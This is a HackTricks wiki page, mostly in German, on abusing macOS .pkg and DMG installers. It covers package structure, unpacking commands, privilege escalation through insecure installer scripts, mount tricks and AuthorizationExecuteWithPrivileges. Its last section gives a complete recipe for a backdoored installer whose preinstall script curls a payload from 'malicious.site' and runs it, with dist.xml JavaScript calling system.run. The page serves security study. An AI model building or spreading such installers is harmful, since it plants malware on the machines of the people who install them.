# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Grundinformationen

Ein macOS **Installationspaket** (auch bekannt als `.pkg`-Datei) ist ein Dateiformat, das von macOS verwendet wird, um **Software zu verteilen**. Diese Dateien sind wie eine **Box, die alles enthält, was ein Stück Software** benötigt, um korrekt installiert und ausgeführt zu werden.

Die Paketdatei selbst ist ein Archiv, das eine **Hierarchie von Dateien und Verzeichnissen enthält, die auf dem Zielcomputer installiert werden**. Es kann auch **Skripte** enthalten, um Aufgaben vor und nach der Installation auszuführen, wie das Einrichten von Konfigurationsdateien oder das Bereinigen alter Versionen der Software.

### Hierarchie

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)**: Anpassungen (Titel, Willkommensnachricht…) und Skript-/Installationsprüfungen
* **PackageInfo (xml)**: Informationen, Installationsanforderungen, Installationsort, Pfade zu auszuführenden Skripten
* **Bill of materials (bom)**: Liste der Dateien, die installiert, aktualisiert oder entfernt werden sollen, mit Dateiberechtigungen
* **Payload (CPIO-Archiv gzip-komprimiert)**: Dateien, die im `install-location` aus PackageInfo installiert werden
* **Skripte (CPIO-Archiv gzip-komprimiert)**: Vor- und Nachinstallationsskripte und weitere Ressourcen, die in ein temporäres Verzeichnis zur Ausführung extrahiert werden.

### Dekomprimieren
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Um den Inhalt des Installers zu visualisieren, ohne ihn manuell zu dekomprimieren, können Sie auch das kostenlose Tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) verwenden.

## DMG Grundinformationen

DMG-Dateien oder Apple-Disk-Images sind ein Dateiformat, das von Apples macOS für Disk-Images verwendet wird. Eine DMG-Datei ist im Wesentlichen ein **einhängbares Disk-Image** (es enthält sein eigenes Dateisystem), das rohe Blockdaten enthält, die typischerweise komprimiert und manchmal verschlüsselt sind. Wenn Sie eine DMG-Datei öffnen, **bindet macOS sie so, als wäre es eine physische Festplatte**, sodass Sie auf ihren Inhalt zugreifen können.

{% hint style="danger" %}
Beachten Sie, dass **`.dmg`**-Installer **so viele Formate** unterstützen, dass in der Vergangenheit einige von ihnen, die Schwachstellen enthielten, missbraucht wurden, um **Kernel-Codeausführung** zu erlangen.
{% endhint %}

### Hierarchie

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Die Hierarchie einer DMG-Datei kann je nach Inhalt unterschiedlich sein. Für Anwendungs-DMGs folgt sie jedoch normalerweise dieser Struktur:

* Oberste Ebene: Dies ist die Wurzel des Disk-Images. Es enthält oft die Anwendung und möglicherweise einen Link zum Anwendungsordner.
* Anwendung (.app): Dies ist die eigentliche Anwendung. In macOS ist eine Anwendung typischerweise ein Paket, das viele einzelne Dateien und Ordner enthält, die die Anwendung ausmachen.
* Anwendungen-Link: Dies ist eine Verknüpfung zum Anwendungsordner in macOS. Der Zweck davon ist es, Ihnen die Installation der Anwendung zu erleichtern. Sie können die .app-Datei auf diese Verknüpfung ziehen, um die App zu installieren.

## Privesc über pkg-Missbrauch

### Ausführung aus öffentlichen Verzeichnissen

Wenn ein Pre- oder Post-Installationsskript beispielsweise aus **`/var/tmp/Installerutil`** ausgeführt wird und ein Angreifer dieses Skript kontrollieren könnte, könnte er die Berechtigungen erhöhen, wann immer es ausgeführt wird. Oder ein weiteres ähnliches Beispiel:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dies ist eine [öffentliche Funktion](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), die mehrere Installer und Updater aufrufen, um **etwas als Root auszuführen**. Diese Funktion akzeptiert den **Pfad** der **Datei**, die **ausgeführt** werden soll, als Parameter. Wenn ein Angreifer jedoch diese Datei **modifizieren** könnte, wäre er in der Lage, ihre Ausführung mit Root zu **missbrauchen**, um die **Berechtigungen zu erhöhen**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Ausführung durch Einhängen

Wenn ein Installer in `/tmp/fixedname/bla/bla` schreibt, ist es möglich, ein **Mount** über `/tmp/fixedname` ohne Besitzer zu **erstellen**, sodass Sie **jede Datei während der Installation ändern** können, um den Installationsprozess auszunutzen.

Ein Beispiel dafür ist **CVE-2021-26089**, das es geschafft hat, ein **periodisches Skript zu überschreiben**, um als Root ausgeführt zu werden. Für weitere Informationen schauen Sie sich den Vortrag an: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg als Malware

### Leerer Payload

Es ist möglich, einfach eine **`.pkg`**-Datei mit **Pre- und Post-Install-Skripten** zu generieren, ohne einen echten Payload außer der Malware in den Skripten.

### JS in der Verteilungs-XML

Es ist möglich, **`<script>`**-Tags in der **Verteilungs-XML**-Datei des Pakets hinzuzufügen, und dieser Code wird ausgeführt und kann **Befehle ausführen** mit **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Hintertüriger Installer

Bösartiger Installer, der ein Skript und JS-Code in dist.xml verwendet.
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

* [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "Die wilde Welt der macOS-Installer" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
